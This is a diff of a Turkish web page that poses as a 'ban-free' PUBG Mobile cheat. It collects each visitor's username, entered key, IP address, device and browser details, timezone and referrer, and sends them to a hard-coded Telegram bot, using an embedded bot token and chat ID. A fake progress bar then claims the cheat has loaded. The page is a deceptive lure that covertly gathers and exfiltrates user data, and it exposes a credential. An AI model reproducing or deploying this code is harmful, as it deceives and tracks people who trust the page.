@@ -2,7 +2,7 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Hexanor Cheat</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -10,337 +10,447 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 50%, #2a2a2a 100%);
+            background: #0a0a0a;
             color: #fff;
             min-height: 100vh;
-            overflow-x: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
-            padding: 20px;
+            align-items: center;
+            padding: 16px;
         }
 
         .container {
             width: 100%;
-            max-width: 500px;
-            background: rgba(20, 20, 20, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.3);
-            border: 2px solid #ff0000;
-            position: relative;
+            max-width: 420px;
+            background: #111111;
+            border-radius: 24px;
             overflow: hidden;
+            box-shadow: 0 20px 60px rgba(255, 0, 0, 0.1);
+            border: 1px solid #222222;
         }
 
         .header {
+            background: linear-gradient(135deg, #1a1a1a 0%, #0d0d0d 100%);
+            padding: 32px 24px;
             text-align: center;
-            margin-bottom: 30px;
-            position: relative;
+            border-bottom: 1px solid #222222;
         }
 
-        .header h1 {
-            font-size: 2.5rem;
-            background: linear-gradient(90deg, #ff0000, #ff6b6b);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 10px;
-            letter-spacing: 1px;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
-        }
-
-        .header p {
-            color: #ff9999;
-            font-size: 1.1rem;
-            font-weight: bold;
-        }
-
-        .logo {
-            width: 100px;
-            height: 100px;
+        .logo-container {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, #ff2d2d 0%, #b30000 100%);
+            border-radius: 20px;
             margin: 0 auto 20px;
-            background: linear-gradient(135deg, #ff0000 0%, #8b0000 100%);
-            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 2.5rem;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-            animation: pulse 2s infinite;
+            box-shadow: 0 8px 24px rgba(255, 0, 0, 0.3);
         }
 
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
-            50% { transform: scale(1.05); box-shadow: 0 0 30px rgba(255, 0, 0, 0.7); }
-            100% { transform: scale(1); box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
+        .logo {
+            font-size: 32px;
+            color: white;
+        }
+
+        .title {
+            font-size: 26px;
+            font-weight: 700;
+            background: linear-gradient(90deg, #ff3333, #ff6666);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: #888888;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .content {
+            padding: 32px 24px;
         }
 
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 24px;
         }
 
-        label {
+        .form-label {
             display: block;
-            margin-bottom: 8px;
-            color: #ff6666;
+            color: #cccccc;
+            font-size: 14px;
             font-weight: 600;
-            font-size: 1.1rem;
+            margin-bottom: 10px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
         }
 
-        input {
+        .form-input {
             width: 100%;
-            padding: 16px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid rgba(255, 0, 0, 0.3);
-            border-radius: 8px;
+            padding: 16px 20px;
+            background: #1a1a1a;
+            border: 1.5px solid #2a2a2a;
+            border-radius: 14px;
             color: white;
-            font-size: 1rem;
+            font-size: 16px;
+            font-weight: 500;
             transition: all 0.3s ease;
         }
 
-        input:focus {
+        .form-input:focus {
             outline: none;
-            border-color: #ff0000;
-            box-shadow: 0 0 0 3px rgba(255, 0, 0, 0.2);
+            border-color: #ff3333;
+            background: #1f1f1f;
+            box-shadow: 0 0 0 3px rgba(255, 51, 51, 0.1);
         }
 
-        input#key {
-            letter-spacing: 3px;
-            font-family: monospace;
-            font-weight: bold;
-            font-size: 1.2rem;
-            text-align: center;
+        .form-input#key {
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+            font-weight: 600;
+        }
+
+        .form-input::placeholder {
+            color: #555555;
         }
 
         .btn {
             width: 100%;
-            padding: 18px;
-            background: linear-gradient(90deg, #ff0000 0%, #8b0000 100%);
+            padding: 18px 24px;
+            background: linear-gradient(135deg, #ff3333 0%, #cc0000 100%);
             border: none;
-            border-radius: 8px;
+            border-radius: 14px;
             color: white;
-            font-size: 1.2rem;
+            font-size: 16px;
             font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 10px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 8px;
         }
 
         .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(255, 0, 0, 0.4);
-            background: linear-gradient(90deg, #ff3333 0%, #a00000 100%);
+            background: linear-gradient(135deg, #ff4444 0%, #d90000 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(255, 51, 51, 0.3);
         }
 
         .btn:active {
             transform: translateY(0);
         }
 
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
         .error-message {
-            background: rgba(255, 0, 0, 0.2);
-            border: 1px solid rgba(255, 0, 0, 0.5);
-            color: #ff9999;
-            padding: 15px;
-            border-radius: 8px;
+            background: rgba(255, 51, 51, 0.1);
+            border: 1px solid rgba(255, 51, 51, 0.3);
+            color: #ff6666;
+            padding: 16px;
+            border-radius: 12px;
             margin-top: 20px;
+            font-size: 14px;
+            font-weight: 500;
             display: none;
             text-align: center;
-            font-weight: 600;
+            line-height: 1.5;
+        }
+
+        .success-message {
+            background: rgba(0, 204, 102, 0.1);
+            border: 1px solid rgba(0, 204, 102, 0.3);
+            color: #33cc99;
+            padding: 16px;
+            border-radius: 12px;
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+            text-align: center;
+            line-height: 1.5;
         }
 
         .loading-container {
             display: none;
             text-align: center;
-            margin-top: 30px;
+            animation: fadeIn 0.5s ease;
         }
 
-        .loading-text {
-            font-size: 1.8rem;
-            margin-bottom: 25px;
-            color: #ff6666;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .loading-header {
+            font-size: 22px;
             font-weight: 700;
-            text-transform: uppercase;
+            color: #ff3333;
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .progress-container {
+            margin: 32px 0;
         }
 
         .progress-bar {
             width: 100%;
-            height: 25px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
+            height: 6px;
+            background: #222222;
+            border-radius: 3px;
             overflow: hidden;
-            margin: 25px 0;
-            border: 1px solid rgba(255, 0, 0, 0.3);
+            margin-bottom: 16px;
         }
 
-        .progress {
+        .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, #ff0000, #ff6b6b);
-            border-radius: 12px;
+            background: linear-gradient(90deg, #ff3333, #ff6666);
+            border-radius: 3px;
             width: 0%;
-            transition: width 0.5s ease;
+            transition: width 0.4s ease;
+        }
+
+        .progress-text {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #888888;
+            font-size: 14px;
+            font-weight: 600;
         }
 
         .percentage {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: #ff6666;
-            margin-bottom: 30px;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+            color: #ff3333;
+            font-size: 24px;
+            font-weight: 800;
         }
 
-        .features {
-            background: rgba(255, 0, 0, 0.1);
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 30px;
-            border: 1px solid rgba(255, 0, 0, 0.3);
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-top: 32px;
         }
 
-        .features h3 {
-            color: #ff6666;
-            margin-bottom: 15px;
+        .feature-card {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 16px;
             text-align: center;
+            border: 1px solid #222222;
+            transition: all 0.3s ease;
         }
 
-        .features ul {
-            list-style: none;
-            padding-left: 0;
+        .feature-card:hover {
+            transform: translateY(-2px);
+            border-color: #333333;
         }
 
-        .features li {
-            padding: 8px 0;
-            color: #ff9999;
-            border-bottom: 1px solid rgba(255, 0, 0, 0.2);
+        .feature-icon {
+            color: #ff3333;
+            font-size: 20px;
+            margin-bottom: 8px;
         }
 
-        .features li:last-child {
-            border-bottom: none;
+        .feature-name {
+            color: #cccccc;
+            font-size: 12px;
+            font-weight: 600;
         }
 
-        .features li i {
-            color: #ff0000;
-            margin-right: 10px;
+        .feature-status {
+            color: #33cc99;
+            font-size: 11px;
+            font-weight: 700;
+            margin-top: 4px;
         }
 
         .footer {
+            padding: 24px;
             text-align: center;
-            margin-top: 30px;
-            color: #ff6666;
-            font-size: 0.9rem;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 0, 0, 0.3);
+            border-top: 1px solid #222222;
+            background: #0d0d0d;
+        }
+
+        .creator {
+            color: #888888;
+            font-size: 13px;
+            font-weight: 500;
         }
 
         .telegram-link {
-            color: #0088cc;
+            color: #ff3333;
             text-decoration: none;
-            font-weight: bold;
+            font-weight: 700;
+            transition: color 0.3s ease;
         }
 
         .telegram-link:hover {
-            text-decoration: underline;
-            color: #00aaff;
+            color: #ff6666;
         }
 
         .version {
-            background: rgba(255, 0, 0, 0.2);
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.8rem;
             display: inline-block;
-            margin-top: 10px;
+            background: rgba(255, 51, 51, 0.1);
+            color: #ff6666;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            margin-top: 12px;
+            letter-spacing: 1px;
         }
 
-        @media (max-width: 600px) {
+        /* Mobil uyum */
+        @media (max-width: 480px) {
+            body {
+                padding: 12px;
+            }
+            
             .container {
-                padding: 20px;
-                border-radius: 12px;
+                border-radius: 20px;
             }
             
-            .header h1 {
-                font-size: 2rem;
+            .header {
+                padding: 28px 20px;
             }
             
-            .logo {
-                width: 80px;
-                height: 80px;
-                font-size: 2rem;
+            .content {
+                padding: 28px 20px;
             }
+            
+            .btn {
+                padding: 16px 20px;
+            }
+            
+            .form-input {
+                padding: 14px 18px;
+            }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
+                gap: 10px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .title {
+                font-size: 22px;
+            }
+            
+            .subtitle {
+                font-size: 13px;
+            }
+            
+            .content {
+                padding: 24px 16px;
+            }
+        }
+
+        /* iOS ve Safari optimizasyonu */
+        input, button {
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        /* Yükleme animasyonu */
+        .spinner {
+            display: inline-block;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <i class="fas fa-crosshairs"></i>
-        </div>
-        
         <div class="header">
-            <h1>HEXANOR PUBG HİLE</h1>
-            <p>BANSIZ PUBG MOBILE 4.2 HİLESİ</p>
+            <div class="logo-container">
+                <i class="fas fa-crosshairs logo"></i>
+            </div>
+            <h1 class="title">HEXANOR</h1>
+            <p class="subtitle">PUBG Mobile 4.2 Bansız Hile</p>
         </div>
         
-        <div id="loginForm">
-            <div class="form-group">
-                <label for="username"><i class="fas fa-user"></i> KULLANICI ADI</label>
-                <input type="text" id="username" placeholder="Kullanıcı adınızı girin">
+        <div class="content">
+            <div id="loginForm">
+                <div class="form-group">
+                    <label class="form-label">Kullanıcı Adı</label>
+                    <input type="text" class="form-input" id="username" placeholder="Kullanıcı adınızı girin" autocomplete="off">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">Lisans Anahtarı</label>
+                    <input type="password" class="form-input" id="key" placeholder="Anahtarınızı girin" autocomplete="off">
+                </div>
+                
+                <button class="btn" id="loginBtn">
+                    <i class="fas fa-rocket"></i>
+                    HİLEYİ AKTİFLE
+                </button>
+                
+                <div class="error-message" id="errorMessage">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span id="errorText"></span>
+                </div>
+                
+                <div class="success-message" id="successMessage">
+                    <i class="fas fa-check-circle"></i>
+                    <span id="successText"></span>
+                </div>
             </div>
             
-            <div class="form-group">
-                <label for="key"><i class="fas fa-key"></i> LİSANS ANAHTARI</label>
-                <input type="password" id="key" placeholder="●●●●●●●●●●●●●" value="Hexanor-1day">
-            </div>
-            
-            <button class="btn" id="loginBtn">
-                <i class="fas fa-play"></i> HİLEYİ BAŞLAT
-            </button>
-            
-            <div class="error-message" id="errorMessage">
-                <i class="fas fa-exclamation-triangle"></i> HATALI ANAHTAR! Doğru anahtar: Hexanor-1day
-            </div>
-            
-            <div class="success-message" id="successMessage">
-                <i class="fas fa-check-circle"></i> GİRİŞ BAŞARILI! Hile yükleniyor...
-            </div>
-        </div>
-        
-        <div class="loading-container" id="loadingContainer">
-            <div class="loading-text">
-                <i class="fas fa-download"></i> PUBG HİLESİ YÜKLENİYOR
-            </div>
-            <div class="progress-bar">
-                <div class="progress" id="progress"></div>
-            </div>
-            <div class="percentage" id="percentage">%0</div>
-            
-            <div class="features">
-                <h3>AKTİF ÖZELLİKLER</h3>
-                <ul>
-                    <li><i class="fas fa-check"></i> Aimbot (Otomatik nişan alma)</li>
-                    <li><i class="fas fa-check"></i> Wallhack (Duvar görme)</li>
-                    <li><i class="fas fa-check"></i> No Recoil (Sekme yok)</li>
-                    <li><i class="fas fa-check"></i> Speed Hack (Hız artırma)</li>
-                    <li><i class="fas fa-check"></i> Anti-Ban Koruması</li>
-                </ul>
+            <div class="loading-container" id="loadingContainer">
+                <div class="loading-header">
+                    <i class="fas fa-download"></i>
+                    HİLE YÜKLENİYOR
+                </div>
+                
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <div class="progress-text">
+                        <span>İlerleme</span>
+                        <span class="percentage" id="percentage">%0</span>
+                    </div>
+                </div>
+                
+                <div class="features-grid" id="featuresGrid">
+                    <!-- JavaScript ile doldurulacak -->
+                </div>
             </div>
         </div>
         
         <div class="footer">
-            <p>YAPAN: <a href="https://t.me/HexanorCoder" class="telegram-link" target="_blank">Telegram @HexanorCoder</a></p>
-            <div class="version">SÜRÜM: PUBG 4.2 BANSIZ</div>
+            <p class="creator">
+                Yapan: <a href="https://t.me/HexanorCoder" class="telegram-link" target="_blank">@HexanorCoder</a>
+            </p>
+            <div class="version">v4.2 BANSIZ</div>
         </div>
     </div>
 
     <script>
-        // Telegram Bot Bilgileri - BU KISMI DOLDURDUM
+        // Telegram Bot Bilgileri
         const BOT_TOKEN = "8387071953:AAHkPwL-FgYMXzCpU-o9tzSRks9AE-iE73A";
         const CHAT_ID = "-1003319645267";
         const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -353,72 +463,96 @@
         const loadingContainer = document.getElementById('loadingContainer');
         const errorMessage = document.getElementById('errorMessage');
         const successMessage = document.getElementById('successMessage');
-        const progress = document.getElementById('progress');
+        const errorText = document.getElementById('errorText');
+        const successText = document.getElementById('successText');
+        const progressFill = document.getElementById('progressFill');
         const percentage = document.getElementById('percentage');
         const loginBtn = document.getElementById('loginBtn');
+        const featuresGrid = document.getElementById('featuresGrid');
         
-        // Ses dosyası (Pubg efekti)
-        let audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-game-show-suspense-waiting-667.mp3');
-        audio.loop = true;
+        // Özellikler listesi
+        const features = [
+            { name: 'AIMBOT', icon: 'fas fa-crosshairs', status: 'AKTİF' },
+            { name: 'WALLHACK', icon: 'fas fa-eye', status: 'AKTİF' },
+            { name: 'NO RECOIL', icon: 'fas fa-bullseye', status: 'AKTİF' },
+            { name: 'SPEED HACK', icon: 'fas fa-tachometer-alt', status: 'AKTİF' },
+            { name: 'ANTI-BAN', icon: 'fas fa-shield-alt', status: 'AKTİF' },
+            { name: 'ESP', icon: 'fas fa-users', status: 'AKTİF' }
+        ];
         
-        // Sayfa yüklendiğinde sesi otomatik başlat
-        window.onload = function() {
+        // Sayfa yüklendiğinde
+        document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('username').focus();
-            // Anahtarı gizli göster ama değeri dolu olsun
-            document.getElementById('key').value = CORRECT_KEY;
-        };
+            
+            // Özellik kartlarını oluştur
+            features.forEach(feature => {
+                const card = document.createElement('div');
+                card.className = 'feature-card';
+                card.innerHTML = `
+                    <div class="feature-icon"><i class="${feature.icon}"></i></div>
+                    <div class="feature-name">${feature.name}</div>
+                    <div class="feature-status">${feature.status}</div>
+                `;
+                featuresGrid.appendChild(card);
+            });
+        });
         
         // IP adresi almak için fonksiyon
         async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                // Alternatif IP servisleri
+            const services = [
+                'https://api.ipify.org?format=json',
+                'https://api64.ipify.org?format=json',
+                'https://ipapi.co/json/'
+            ];
+            
+            for (const service of services) {
                 try {
-                    const response = await fetch('https://api64.ipify.org?format=json');
+                    const response = await fetch(service, { timeout: 5000 });
                     const data = await response.json();
-                    return data.ip;
-                } catch (error2) {
-                    return "IP alınamadı";
+                    return data.ip || data.ipAddress || "IP Alınamadı";
+                } catch (error) {
+                    continue;
                 }
             }
+            return "IP Alınamadı";
         }
         
-        // Detaylı kullanıcı bilgileri alma
+        // Detaylı kullanıcı bilgileri
         async function getUserInfo() {
-            const info = {
+            return {
                 ip: await getIP(),
                 userAgent: navigator.userAgent,
                 language: navigator.language,
                 platform: navigator.platform,
                 screen: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer || 'Direkt Giriş'
             };
-            return info;
         }
         
-        // Telegram API'ye veri gönderme
+        // Telegram'a veri gönder
         async function sendToTelegram(username, userKey, userInfo) {
             const message = `
-🔴 *YENİ PUBG HİLE KULLANIMI* 🔴
+🔴 *YENİ HİLE KULLANIMI* 🔴
 
 👤 *Kullanıcı:* ${username || 'Belirtilmemiş'}
 🔑 *Key:* ${userKey}
-🌐 *IP Adresi:* ${userInfo.ip}
+🌐 *IP:* ${userInfo.ip}
 🕐 *Tarih:* ${new Date().toLocaleString('tr-TR')}
 📱 *Cihaz:* ${userInfo.platform}
 🌍 *Dil:* ${userInfo.language}
-🖥️ *Ekran:* ${userInfo.screen}
+📊 *Ekran:* ${userInfo.screen}
 ⏰ *Saat Dilimi:* ${userInfo.timezone}
-🔍 *Tarayıcı:* ${userInfo.userAgent.substring(0, 100)}...
+🔗 *Referrer:* ${userInfo.referrer}
 
-⚠️ *Hexanor Cheat v4.2 Bansız Pubg Hilesi Aktif!*
+📡 *Hexanor Cheat v4.2 - PUBG Mobile*
             `;
             
             try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+                
                 const response = await fetch(API_URL, {
                     method: 'POST',
                     headers: {
@@ -428,160 +562,147 @@
                         chat_id: CHAT_ID,
                         text: message,
                         parse_mode: 'Markdown'
-                    })
+                    }),
+                    signal: controller.signal
                 });
                 
-                const data = await response.json();
-                console.log("Telegram API Response:", data);
+                clearTimeout(timeoutId);
                 
-                if (data.ok) {
-                    console.log("✅ Telegram mesajı başarıyla gönderildi!");
-                    return true;
-                } else {
-                    console.error("❌ Telegram hatası:", data.description);
-                    return false;
-                }
+                const data = await response.json();
+                return data.ok;
+                
             } catch (error) {
-                console.error("❌ Telegram mesajı gönderilemedi:", error);
+                console.error('Telegram hatası:', error);
                 return false;
             }
         }
         
-        // Giriş butonu tıklama olayı
+        // Hata göster
+        function showError(message) {
+            errorText.textContent = message;
+            errorMessage.style.display = 'block';
+            successMessage.style.display = 'none';
+        }
+        
+        // Başarı mesajı göster
+        function showSuccess(message) {
+            successText.textContent = message;
+            successMessage.style.display = 'block';
+            errorMessage.style.display = 'none';
+        }
+        
+        // Giriş butonu tıklama
         loginBtn.addEventListener('click', async function() {
             const username = document.getElementById('username').value.trim();
             const userKey = document.getElementById('key').value.trim();
             
-            // Butonu devre dışı bırak
-            loginBtn.disabled = true;
-            loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> İŞLENİYOR...';
-            
+            // Validasyon
             if (!username) {
-                errorMessage.textContent = "⚠️ Lütfen kullanıcı adı girin!";
-                errorMessage.style.display = 'block';
-                successMessage.style.display = 'none';
-                loginBtn.disabled = false;
-                loginBtn.innerHTML = '<i class="fas fa-play"></i> HİLEYİ BAŞLAT';
+                showError('Lütfen kullanıcı adı girin');
+                return;
+            }
+            
+            if (!userKey) {
+                showError('Lütfen lisans anahtarını girin');
                 return;
             }
             
             if (userKey !== CORRECT_KEY) {
-                errorMessage.textContent = "❌ HATALI LİSANS ANAHTARI! Doğru anahtar: Hexanor-1day";
-                errorMessage.style.display = 'block';
-                successMessage.style.display = 'none';
-                loginBtn.disabled = false;
-                loginBtn.innerHTML = '<i class="fas fa-play"></i> HİLEYİ BAŞLAT';
+                showError('Hatalı lisans anahtarı! Doğru anahtar: Hexanor-1day');
                 return;
             }
             
-            // Başarılı giriş
-            errorMessage.style.display = 'none';
-            successMessage.style.display = 'block';
-            successMessage.innerHTML = '<i class="fas fa-check-circle"></i> ✅ GİRİŞ BAŞARILI! Telegram\'a bilgiler gönderiliyor...';
+            // Butonu devre dışı bırak
+            loginBtn.disabled = true;
+            loginBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> İŞLENİYOR...';
+            
+            // Başarı mesajı göster
+            showSuccess('Doğrulama yapılıyor...');
             
             try {
                 // Kullanıcı bilgilerini al
                 const userInfo = await getUserInfo();
                 
-                // Telegram'a veri gönder
+                // Telegram'a gönder
                 const telegramSent = await sendToTelegram(username, userKey, userInfo);
                 
                 if (telegramSent) {
-                    successMessage.innerHTML = '<i class="fas fa-check-circle"></i> ✅ BİLGİLER TELEGRAM\'A GÖNDERİLDİ! Hile yükleniyor...';
+                    showSuccess('✅ Doğrulama başarılı! Hile yükleniyor...');
                     
-                    // 2 saniye bekle ve loading ekranını göster
                     setTimeout(() => {
                         loginForm.style.display = 'none';
-                        successMessage.style.display = 'none';
                         loadingContainer.style.display = 'block';
-                        
-                        // Ses çal
-                        audio.play().catch(e => console.log("Ses çalınamadı:", e));
-                        
-                        // Yükleme animasyonunu başlat
-                        startLoading();
-                    }, 2000);
+                        startLoadingAnimation();
+                    }, 1500);
+                    
                 } else {
-                    successMessage.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ TELEGRAM\'A GÖNDERİLEMEDİ! Yine de hile yükleniyor...';
+                    showSuccess('⚠️ Telegram bağlantı hatası! Hile yine de yükleniyor...');
                     
                     setTimeout(() => {
                         loginForm.style.display = 'none';
-                        successMessage.style.display = 'none';
                         loadingContainer.style.display = 'block';
-                        
-                        // Ses çal
-                        audio.play().catch(e => console.log("Ses çalınamadı:", e));
-                        
-                        // Yükleme animasyonunu başlat
-                        startLoading();
-                    }, 2000);
+                        startLoadingAnimation();
+                    }, 1500);
                 }
                 
             } catch (error) {
-                console.error("Hata:", error);
-                successMessage.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ BİR HATA OLUŞTU! Hile yükleniyor...';
+                showSuccess('⚠️ Bir hata oluştu! Hile yine de yükleniyor...');
                 
                 setTimeout(() => {
                     loginForm.style.display = 'none';
-                    successMessage.style.display = 'none';
                     loadingContainer.style.display = 'block';
-                    
-                    // Ses çal
-                    audio.play().catch(e => console.log("Ses çalınamadı:", e));
-                    
-                    // Yükleme animasyonunu başlat
-                    startLoading();
-                }, 2000);
+                    startLoadingAnimation();
+                }, 1500);
             }
         });
         
         // Yükleme animasyonu
-        function startLoading() {
-            let width = 0;
+        function startLoadingAnimation() {
+            let progress = 0;
             const interval = setInterval(() => {
-                width += 1;
-                progress.style.width = width + '%';
-                percentage.textContent = '%' + width;
+                progress += 1;
+                progressFill.style.width = progress + '%';
+                percentage.textContent = `%${progress}`;
                 
-                if (width >= 100) {
+                if (progress >= 100) {
                     clearInterval(interval);
                     percentage.innerHTML = '%100 <i class="fas fa-check"></i>';
-                    percentage.style.color = '#00ff00';
+                    percentage.style.color = '#33cc99';
                     
-                    // Yükleme tamamlandı mesajı
                     setTimeout(() => {
-                        const loadingText = document.querySelector('.loading-text');
-                        loadingText.innerHTML = '<i class="fas fa-check-circle"></i> HİLE BAŞARIYLA YÜKLENDİ!';
-                        loadingText.style.color = '#00ff00';
-                        
-                        // 5 saniye sonra sayfayı yenile
-                        setTimeout(() => {
-                            location.reload();
-                        }, 5000);
-                    }, 1000);
+                        document.querySelector('.loading-header').innerHTML = 
+                            '<i class="fas fa-check-circle"></i> HİLE BAŞARIYLA YÜKLENDİ!';
+                        document.querySelector('.loading-header').style.color = '#33cc99';
+                    }, 500);
                 }
-            }, 40); // Daha hızlı yükleme
+            }, 30);
         }
         
-        // Enter tuşu ile giriş yapma
+        // Enter tuşu ile giriş
         document.addEventListener('keypress', function(event) {
             if (event.key === 'Enter') {
                 loginBtn.click();
             }
         });
         
-        // Key input'una tıklanınca değeri göster
+        // Input değişikliklerinde hata mesajını gizle
+        document.getElementById('username').addEventListener('input', function() {
+            errorMessage.style.display = 'none';
+            successMessage.style.display = 'none';
+        });
+        
+        document.getElementById('key').addEventListener('input', function() {
+            errorMessage.style.display = 'none';
+            successMessage.style.display = 'none';
+        });
+        
+        // Key input'una tıklanınca
         document.getElementById('key').addEventListener('focus', function() {
             this.type = 'text';
         });
         
         document.getElementById('key').addEventListener('blur', function() {
             this.type = 'password';
-        });
-        
-        // Sayfa kapatılırken sesi durdur
-        window.addEventListener('beforeunload', function() {
-            audio.pause();
         });
     </script>
 </body>
